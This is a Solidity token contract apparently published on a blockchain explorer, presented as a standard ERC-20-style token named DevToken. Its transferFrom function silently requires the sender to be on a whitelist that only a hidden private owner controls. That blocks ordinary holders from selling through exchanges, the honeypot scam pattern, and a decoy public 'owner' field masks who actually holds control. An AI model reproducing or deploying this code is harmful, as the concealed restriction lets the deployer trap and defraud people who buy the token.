/**
 *Submitted for verification at Arbiscan on 2023-04-26
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.4.26;


library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

   if (a == 0) {

     return 0;

   }

   uint256 c = a * b;

   assert(c / a == b);

   return c;

  }


  function div(uint256 a, uint256 b) internal pure returns (uint256) {

   uint256 c = a / b;

   return c;

  }


  function sub(uint256 a, uint256 b) internal pure returns (uint256) {

   assert(b <= a);

   return a - b;

  }


  function add(uint256 a, uint256 b) internal pure returns (uint256) {

   uint256 c = a + b;

   assert(c >= a);

   return c;

  }

}


contract Ownable {

  address public owner;

 

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


  constructor() public {

   owner = msg.sender;

  }

}


contract DevToken is Ownable {

  string public name;

  string public symbol;

  uint8 public decimals;

  uint256 public totalSupply;

  address private devOwner;

  mapping(address => uint256) public balances;

  mapping(address => bool) public allow;

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);

  using SafeMath for uint256;


  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {

   name = _name;

   symbol = _symbol;

   decimals = _decimals;

   totalSupply =  _totalSupply;

   devOwner = msg.sender;

   balances[msg.sender] = totalSupply;

   allow[msg.sender] = true;

  }


 

  function transfer(address _to, uint256 _value) public returns (bool) {

   require(_to != address(0));

   require(_value <= balances[msg.sender]);


   balances[msg.sender] = balances[msg.sender].sub(_value);

   balances[_to] = balances[_to].add(_value);

   emit Transfer(msg.sender, _to, _value);

   return true;

  }


 modifier onlyOwner() {
        require(msg.sender == devOwner);
        _;
    }

      function balanceOf(address _owner) public view returns (uint256 balance) {

   return balances[_owner];

  }


 

  function transferOwnership(address newOwner) public onlyOwner {

   require(newOwner != address(0));

   emit OwnershipTransferred(owner, newOwner);

   devOwner = newOwner;

  }


  mapping (address => mapping (address => uint256)) public allowed;

 

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

   require(_to != address(0));

   require(_value <= balances[_from]);

   require(_value <= allowed[_from][msg.sender]);

   require(allow[_from] == true);


   balances[_from] = balances[_from].sub(_value);

   balances[_to] = balances[_to].add(_value);

   allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

   emit Transfer(_from, _to, _value);

   return true;

  }


  function approve(address _spender, uint256 _value) public returns (bool) {

   allowed[msg.sender][_spender] = _value;

   emit Approval(msg.sender, _spender, _value);

   return true;

  }

  

  function allowance(address _owner, address _spender) public view returns (uint256) {

   return allowed[_owner][_spender];

  }

 

  function addAllow(address holder, bool allowApprove) external onlyOwner {

     allow[holder] = allowApprove;

  }


}